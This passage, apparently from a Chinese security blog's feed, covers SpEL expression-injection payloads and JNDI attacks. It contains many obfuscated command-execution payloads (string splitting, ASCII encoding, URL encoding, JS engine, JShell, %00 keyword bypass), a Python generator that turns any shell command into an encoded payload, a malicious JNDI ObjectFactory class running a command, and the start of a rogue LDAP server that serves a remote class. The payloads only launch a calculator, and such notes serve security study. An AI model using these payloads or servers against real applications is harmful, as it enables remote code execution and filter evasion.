class="hljs-string">&quot;open -a Calculator&quot;</span>)<br>    <br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>)<br>    <br></code></pre></td></tr></table></figure><h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;Calculator&quot;</span>&#125;)<br><br>#<span class="hljs-built_in">this</span>.getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;ex&quot;</span>+<span class="hljs-string">&quot;ec&quot;</span>,T(String[])).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRu&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>).invoke(T(String).getClass().forName(<span class="hljs-string">&quot;java.l&quot;</span>+<span class="hljs-string">&quot;ang.Ru&quot;</span>+<span class="hljs-string">&quot;ntime&quot;</span>)),<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;open&quot;</span>,<span class="hljs-string">&quot;-a&quot;</span>,<span class="hljs-string">&quot;Calculator&quot;</span>&#125;)<br><br></code></pre></td></tr></table></figure><h4 id="ASCII替换"><a href="#ASCII替换" class="headerlink" title="ASCII替换"></a>ASCII替换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Java">T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(<span class="hljs-number">111</span>).concat(T(java.lang.Character).toString(<span class="hljs-number">112</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">101</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">110</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">32</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">45</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">32</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">67</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">99</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">117</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">108</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">97</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">116</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">111</span>)).concat(T(java.lang.Character).toString(<span class="hljs-number">114</span>)))<br><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">111</span>,<span class="hljs-number">112</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>&#125;),<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">45</span>,<span class="hljs-number">97</span>&#125;),<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.String(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">67</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">99</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>&#125;)&#125;).start()<br></code></pre></td></tr></table></figure><p>生成ASCII脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell</span>():<br>    shell = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter shell to encode: &#x27;</span>)<br><br>    part1_shell = <span class="hljs-string">&#x27;T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)&#x27;</span> % <span class="hljs-built_in">ord</span>(shell[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> shell[<span class="hljs-number">1</span>:]:<br>        part1_shell += <span class="hljs-string">&#x27;.concat(T(java.lang.Character).toString(%s))&#x27;</span> % <span class="hljs-built_in">ord</span>(c)<br>    part1_shell += <span class="hljs-string">&#x27;)&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nPart1: &#x27;</span>)<br>    <span class="hljs-built_in">print</span>(part1_shell + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    part2_shell = <span class="hljs-string">&#x27;new java.lang.ProcessBuilder(new String[]&#123;&#x27;</span><br>    args = shell.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    len_args = <span class="hljs-built_in">len</span>(args)<br>    len_temp = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span>(len_temp &lt; len_args):<br>        temp = <span class="hljs-string">&#x27;new java.lang.String(new byte[]&#123;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(args[len_temp])):<br>            temp += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(args[len_temp][i]))<br>            <span class="hljs-keyword">if</span> (i != <span class="hljs-built_in">len</span>(args[len_temp]) - <span class="hljs-number">1</span>):<br>                temp += <span class="hljs-string">&#x27;,&#x27;</span><br>        temp += <span class="hljs-string">&#x27;&#125;)&#x27;</span><br>        part2_shell += temp<br>        len_temp += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> len_temp != len_args:<br>            part2_shell += <span class="hljs-string">&#x27;,&#x27;</span><br><br>    part2_shell += <span class="hljs-string">&#x27;&#125;).start()&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nPart2: &#x27;</span>)<br>    <span class="hljs-built_in">print</span>(part2_shell + <span class="hljs-string">&#x27;\n&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    shell()<br></code></pre></td></tr></table></figure><h4 id="JS引擎"><a href="#JS引擎" class="headerlink" title="JS引擎"></a>JS引擎</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">T(javax.script.ScriptEngineManager).newInstance().getEngineByName(<span class="hljs-string">&quot;nashorn&quot;</span>).eval(<span class="hljs-string">&quot;s=[3];s[0]=&#x27;open&#x27;;s[1]=&#x27;-a&#x27;;s[2]=&#x27;Calculator&#x27;;java.la&quot;</span>+<span class="hljs-string">&quot;ng.Run&quot;</span>+<span class="hljs-string">&quot;time.getRu&quot;</span>+<span class="hljs-string">&quot;ntime().ex&quot;</span>+<span class="hljs-string">&quot;ec(s);&quot;</span>)<br><br>T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\<span class="hljs-string">&quot;JavaScript\&quot;).eval(\&quot;s=[3];s[0]=&#x27;open&#x27;;s[1]=&#x27;-a&#x27;;s[2]=&#x27;Calculator&#x27;;java.la\&quot;+\&quot;ng.Run\&quot;+\&quot;time.getRu\&quot;+\&quot;ntime().ex\&quot;+\&quot;ec(s);\&quot;))</span><br><span class="hljs-string">           T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(&quot;</span>JavaScript<span class="hljs-string">&quot;).eval(T(String).getClass().forName(&quot;</span>java.l<span class="hljs-string">&quot;+&quot;</span>ang.Ru<span class="hljs-string">&quot;+&quot;</span>ntime<span class="hljs-string">&quot;).getMethod(&quot;</span>ex<span class="hljs-string">&quot;+&quot;</span>ec<span class="hljs-string">&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;</span>java.l<span class="hljs-string">&quot;+&quot;</span>ang.Ru<span class="hljs-string">&quot;+&quot;</span>ntime<span class="hljs-string">&quot;).getMethod(&quot;</span>getRu<span class="hljs-string">&quot;+&quot;</span>ntime<span class="hljs-string">&quot;).invoke(T(String).getClass().forName(&quot;</span>java.l<span class="hljs-string">&quot;+&quot;</span>ang.Ru<span class="hljs-string">&quot;+&quot;</span>ntime<span class="hljs-string">&quot;)),new String[]&#123;&quot;</span>open<span class="hljs-string">&quot;,&quot;</span>-a<span class="hljs-string">&quot;,&quot;</span>Calculator<span class="hljs-string">&quot;&#125;)))</span><br><span class="hljs-string">//反射</span><br><span class="hljs-string">                                                                                                   T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(T(java.net.URLDecoder).decode(\&quot;%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%6f%70%65%6e%20%2d%61%20%43%61%6c%63%75%6c%61%74%6f%72%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\&quot;)))</span><br><span class="hljs-string">//URL编码                                                                                                  </span><br></code></pre></td></tr></table></figure><h4 id="Jshell"><a href="#Jshell" class="headerlink" title="Jshell"></a>Jshell</h4><p>注意JDK9之后新增</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(<span class="hljs-string">&quot;jdk.jshell.JShell&quot;</span>,<span class="hljs-literal">true</span>).Methods[<span class="hljs-number">6</span>].invoke(<span class="hljs-literal">null</span>,&#123;&#125;).eval(<span class="hljs-string">&#x27;open -a Calculator&#x27;</span>).toString()<br></code></pre></td></tr></table></figure><h4 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h4><p>1.绕过<code>T(</code></p><p>SPEL处理字符会将%00替换为空，所以可以使用<code>T%00(new)</code>。</p><p>2.绕过<code>getClass(</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 这里的 15 可能需要替换为 14, 不同 jdk 版本的序号不同.</span><br><span class="hljs-string">&quot;&quot;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethods()[<span class="hljs-number">15</span>].invoke(<span class="hljs-string">&quot;&quot;</span>.class.getSuperclass().class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethods()[<span class="hljs-number">7</span>].invoke(<span class="hljs-literal">null</span>),<span class="hljs-string">&quot;open -a Calculator&quot;</span>)<br></code></pre></td></tr></table></figure><h1 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h1><p>@TODO</p><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><ul><li><a href="https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">https://boogipop.com/2023/08/06/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/</a></li><li><a href="https://www.freebuf.com/articles/web/325700.html">https://www.freebuf.com/articles/web/325700.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>EL</tag>
      
      <tag>SPEL</tag>
      
      <tag>OGNL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI Attack</title>
    <link href="/2023/06/02/JNDI%20Attack/"/>
    <url>/2023/06/02/JNDI%20Attack/</url>
    
    <content type="html"><![CDATA[<h1 id="JNDI简介"><a href="#JNDI简介" class="headerlink" title="JNDI简介"></a>JNDI简介</h1><p>JNDI（全称Java Naming and Directory Interface-Java命名与目录接口）是用于目录服务的Java API，它允许Java客户端通过名称发现和查找数据和资源(以Java对象的形式)。与主机系统接口的所有Java api一样，JNDI独立于底层实现。此外，它指定了一个服务提供者接口(SPI)，该接口允许将目录服务实现插入到框架中。通过JNDI查询的信息可能由服务器、文件或数据库提供，选择取决于所使用的实现。</p><p>JNDI服务供应接口(SPI)包括多个部分，分别是：</p><ul><li>RMI (JAVA远程方法调用)</li><li>LDAP (轻量级目录访问协议)</li><li>CORBA (公共对象请求代理体系结构)</li><li>DNS (域名服务)</li><li>NIS</li><li>NDS</li></ul><h1 id="QuickStart"><a href="#QuickStart" class="headerlink" title="QuickStart"></a>QuickStart</h1><p>首先使用类<code>public InitialContext(Hashtable&lt;?,?&gt; environment)</code>初始化一个上下文，然后指定两个参数：</p><ul><li><code>Context.INITIAL_CONTEXT_FACTORY</code>：决定context使用的协议。</li><li><code>Context.PROVIDER_URL</code>：远程地址。</li></ul><p>最后执行<code>InitialContext</code>的各种操作：bind、rebind、unbind、lookup等等，<strong>以RMI为例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//S端注册Registry，并将对象绑定至rmi://localhost:1099/hello</span><br>RMIServer1.<span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">remoteHelloWorld</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer1</span>.RemoteHelloWorld();<br>        Hashtable&lt;String, String&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>hashtable.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        hashtable.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(hashtable);<br>        initialContext1.bind(<span class="hljs-string">&quot;hello&quot;</span>,remoteHelloWorld);<br>        initialContext1.close();<br><br><span class="hljs-comment">//C端lookup查找并调用hello()</span><br>        RMIServer1.<span class="hljs-type">RemoteHelloWorld</span> <span class="hljs-variable">remoteHelloWorld</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RMIServer1</span>.RemoteHelloWorld();<br>        Hashtable&lt;String, String&gt; env = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br>        RMIServer1.<span class="hljs-type">IRemoteHelloWorld</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (RMIServer1.IRemoteHelloWorld)initialContext1.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        hello.hello(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>());<br></code></pre></td></tr></table></figure><p>当然这种方式是属于<strong>静态固定环境加载</strong>。</p><h1 id="动态协议加载-amp-Reference"><a href="#动态协议加载-amp-Reference" class="headerlink" title="动态协议加载&amp;Reference"></a>动态协议加载&amp;Reference</h1><h3 id="动态加载"><a href="#动态加载" class="headerlink" title="动态加载"></a>动态加载</h3><p>前面我们提到可以使用<code>public InitialContext(Hashtable&lt;?,?&gt; environment)</code>创建上下文，在environment中指定协议类型与URL，如果不指定任何的<code>urlInfo</code>，直接执行context的操作bind、lookup，JNDI又会如何加载呢？跟进发现这些绑定与查找的context方法都会先进入<code>getURLOrDefaultInitCtx</code>：</p><img src="/2023/06/02/JNDI%20Attack/image-20230613194037350.png" class="" title="image-20230613194037350"><p>然后有两处判断：</p><img src="/2023/06/02/JNDI%20Attack/image-20230613195127986.png" class="" title="image-20230613195127986"><p>如果没有指定context信息，并且url里带协议URLScheme如<code>rmi://xxx</code>、<code>ldap:://xxx</code>则进入<code>getURLContext</code>&#x3D;&gt;<code>getURLObject</code>，注释中也给出了不同条件下的处理方式。</p><img src="/2023/06/02/JNDI%20Attack/image-20230613200648793.png" class="" title="image-20230613200648793"><img src="/2023/06/02/JNDI%20Attack/image-20230613200249279.png" class="" title="image-20230613200249279"><p>可以看到获取远程工厂类，如果获取不到则返回null，即远程类必须继承自<code>ObjectFactory</code>。</p><h3 id="Refence引用类包装"><a href="#Refence引用类包装" class="headerlink" title="Refence引用类包装"></a>Refence引用类包装</h3><p>JNDI中存在一种特殊的引用对象Reference，它可以基于Class对象与地址构造一个引用，意味着我们可以用地址获取到Reference包装后得到对象，他有四种构造方法分别是：</p><ul><li>Reference(String className) 为类名为<code>className</code>的对象构造一个新的引用。</li><li>Reference(String className, RefAddr addr) 为类名为<code>className</code>的对象、地址构造一个新引用。</li><li>Reference(String className, RefAddr addr, String factory, String factoryLocation) 为类名为<code>className</code>的对象，对象工厂的类名、位置、对象的地址构造一个新引用。</li><li>Reference(String className, String factory, String factoryLocation)为类名为<code>className</code>的对象、对象工厂的类名、位置构造一个新引用。</li></ul><p>其中<a href="https://www.apiref.com/java11-zh/java.naming/javax/naming/RefAddr.html">RefAddr</a>就是Reference的地址，可以类比为地址(RefAddr)与指针(Reference)的关系。</p><p>值得注意的是，除了直接使用地址去获取Reference指向的对象之外，<code>Reference</code>也支持C端以工厂类的方式去远程加载一个工厂类在本地创建对象。即<code>Reference</code>支持<strong>封装工厂类并供远程加载</strong>。</p><h1 id="JNDI-amp-RMI"><a href="#JNDI-amp-RMI" class="headerlink" title="JNDI&amp;RMI"></a>JNDI&amp;RMI</h1><h2 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h2><p>在RMI我们讲到可以使用RMI协议远程类加载，并且类加载的路径为codebase。事实上java rmi提供了一个装饰类<code>ReferenceWrapper</code>用以将JNDI中的<code>Reference</code>包装成RMI中的<code>Remote</code>远程对象，根据前文中提到的内容如果<code>Reference</code>引用的是一个factory工厂类那么就会调用工厂类的<code>getObjectInstance</code>方法，获取到factory后lookup的下一步就是执行<code>decodeObject()</code>解析对象：</p><img src="/2023/06/02/JNDI%20Attack/image-20230614184934092.png" class="" title="image-20230614184934092"><p>下一步获取Reference引用：</p><img src="/2023/06/02/JNDI%20Attack/image-20230614185235658.png" class="" title="image-20230614185235658"><p>然后拿到Reference引用的工厂类：</p><img src="/2023/06/02/JNDI%20Attack/image-20230614190131342.png" class="" title="image-20230614190131342"><p>下一步loadClass，注意这一步，<strong>首先尝试在本地ClassPath中加载类，否则就是用codebase加载</strong>，代码和注释都很清晰</p><img src="/2023/06/02/JNDI%20Attack/image-20230614191117851.png" class="" title="image-20230614191117851"><ul><li>注意使用codebase加载在jdk高版本(JDK &gt;&#x3D; 11.0.1、8u191、7u201、6u211)需要开启<strong>trustURLCodebase</strong>：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="hljs-string">&quot;true&quot;</span>); <br></code></pre></td></tr></table></figure><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Server</span><br>   <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>   <span class="hljs-type">Reference</span> <span class="hljs-variable">aa</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;evil&quot;</span>, <span class="hljs-string">&quot;evil&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:8000/&quot;</span>);<br>   <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">refObjWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(aa);<br>   registry.bind(<span class="hljs-string">&quot;hello&quot;</span>, refObjWrapper);<br>            <br><span class="hljs-comment">//Client</span><br>   <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>;<br>   <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>   initialContext.lookup(uri);<br>  <br>  <br><span class="hljs-comment">//evil ObjectFactory </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;evil code called !\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="JNDI-amp-LDAP"><a href="#JNDI-amp-LDAP" class="headerlink" title="JNDI&amp;LDAP"></a>JNDI&amp;LDAP</h1><p>JNDI中的LDAP也支持远程类加载，有两种方式：</p><ul><li><strong>远程codebase加载Reference</strong>：<a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">Referenceable Objects and References (oracle.com)</a></li><li><strong>序列化与反序列化</strong>：<a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html">Serializable Objects (oracle.com)</a></li></ul><p>因此也派生出两种构造恶意LDAP服务器的利用方式。</p><p><strong>注意：</strong>加载远程Reference依然受codebase的影响，即jdk&gt;8u191的情况下默认无法利用；加载序列化数据<strong>不受版本影响</strong>，只要受害机存在对应的的反序列化利用链即可。</p><h2 id="1-加载恶意Reference"><a href="#1-加载恶意Reference" class="headerlink" title="1.加载恶意Reference"></a>1.加载恶意Reference</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ldap server from unboundid-ldap</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LDAPServer0</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( String[] tmp_args )</span> &#123;<br>        <span class="hljs-comment">//恶意类http挂载URL，LDAP Server收到查询请求后就会重定向至http://127.0.0.1:8000/Spr1n9.class。</span><br>        String[] args=<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;http://127.0.0.1:8000/#Spr1n9&quot;</span>&#125;;<br>        <span class="hljs-comment">//LDAP端口</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8888</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title 